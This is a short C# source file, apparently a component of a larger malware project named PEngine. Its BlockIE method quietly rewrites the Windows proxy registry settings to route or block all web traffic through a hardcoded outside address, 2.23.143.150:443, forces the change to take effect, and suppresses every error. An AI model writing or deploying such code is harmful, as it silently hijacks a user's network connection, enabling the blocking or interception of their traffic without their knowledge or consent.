namespace PEngine.Sticks
{
    using Microsoft.Win32;
    using PEngine.Helpers;
    using System;
    using System.IO;
    using System.Security;

    public class BlockIE
    {
        public static void Enabled(int block_internet)
        {
            using (var hklmHive_x64 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32))
            {
                using (RegistryKey runKey = hklmHive_x64.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings", Environment.Is64BitOperatingSystem ? true : false))
                {
                    try
                    {
                        runKey?.SetValue("ProxyEnable", block_internet);
                        runKey?.SetValue("ProxyServer", "2.23.143.150:443");

                        NativeMethods.InternetSetOption(IntPtr.Zero, (int)Enums.INTERNET_OPTION.INTERNET_OPTION_SETTINGS_CHANGED, IntPtr.Zero, 0);
                        NativeMethods.InternetSetOption(IntPtr.Zero, (int)Enums.INTERNET_OPTION.INTERNET_OPTION_REFRESH, IntPtr.Zero, 0);
                    }
                    catch (UnauthorizedAccessException) { }
                    catch (ArgumentException) { }
                    catch (IOException) { }
                    catch (SecurityException) { }
                }
            }
        }
    }
}